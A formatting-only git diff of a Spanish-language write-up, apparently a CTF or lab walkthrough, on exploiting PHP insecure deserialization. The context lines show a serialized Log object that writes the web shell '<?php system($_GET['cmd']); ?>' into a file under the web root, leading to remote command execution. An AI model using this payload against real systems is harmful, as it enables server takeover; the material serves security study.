@@ -140,7 +140,7 @@ En base a los comentarios se comprueba que básicamente este script se utiliza p
   - Una función que serializa un objeto php.
   - La idea es que se podría crear un objeto LOG, con datos controlados por el usuario, serializarlo y enviarlo al servidor que hará el unmarshalling y ejecutará el código.
 
-- Fichero resultante:payload.php
+- Fichero resultante: payload.php
 
 ```php
 <?php
@@ -308,6 +308,7 @@ echo serialize($obj)."\n";
 #### Creación del objeto serializado
 
 En el fichero "payload.php" se modifican las siguientes lineas:
+
 ```php
 <?php
 
@@ -320,7 +321,9 @@ echo serialize($obj)."\n";
 ?>
 ````
 Y se obtiene el objeto php serializado:
+
 `php payload.php`
+
 `O:3:"Log":2:{s:8:"filename";s:33:"/var/www/html/scriptz/shell_c.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}`
 
 #### Shell remota en el sistema
